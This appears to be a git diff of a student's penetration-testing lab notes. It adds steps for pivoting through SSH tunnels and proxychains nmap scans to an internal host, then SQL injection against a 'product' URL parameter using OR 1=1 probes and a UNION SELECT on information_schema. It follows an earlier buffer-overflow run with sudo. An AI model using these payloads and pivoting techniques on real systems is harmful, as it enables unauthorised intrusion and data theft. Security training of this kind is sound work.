@@ -1,4 +1,4 @@
-DLL Hijacking on Dry Run issues
+Exploit Development on Dry Run issues
 
   - made a new script on the target box in this case www-data
   - set my bin bash
@@ -54,3 +54,30 @@ print(offset + eip + nop + buf)
 
 run 
 sudo ./exploit_me $(python bench.py)
+
+
+
+
+After this I was asked to enumerate further boxes.
+- Looked in etc/hosts and found 192.168.28.175
+- established tunnel to t1 ( ssh -MS /tmp/data www-data@10.50.18.3)
+- made dynamic tunnel to scan new ip ( ssh -S /tmp/data /dryrun -O forward -D 9050)
+- nmap scanned new ip (proxychains nmap --script=http-enum 192.168.28.175)
+- with these new ports I opened a tunnel to that http site and the ssh (ssh -S /tmp/data /dryrun -O forward -L 7676:192.168.28.175:8000 9999:192.168.28.175:2222)
+
+
+SQL INJECTION
+
+Open the web server
+- you get prompted with a selection of peripherals and a submit button
+- you hit the submit button and your url should look something like this (http://127.0.0.1:7676/pick.php?product=4&Submit=Submit)
+- take not of everything past the question mark. Your selection field is "product=" as you can see from the url.
+- gradually begin increasing the number after that equal sign until you get a table that includes everything. that is your vulnerable field. (ex: product=1 OR 1=1    product=2 OR 1=1    product=3 OR 1=1    product=4 OR 1=1)
+- after we find this field we run our golden statement. product=7 UNION SELECT Table_schema,Column_name,table_name FROM Information_schema.columns
+- scroll down the results until you seed man made inputs that seem suspicous
+
+mysql 	user 	$Password
+mysql 	user 	$Select_priv
+mysql 	user 	$Insert_priv
+mysql 	user 	$Update_priv
+mysql 	user 	$Delete_priv
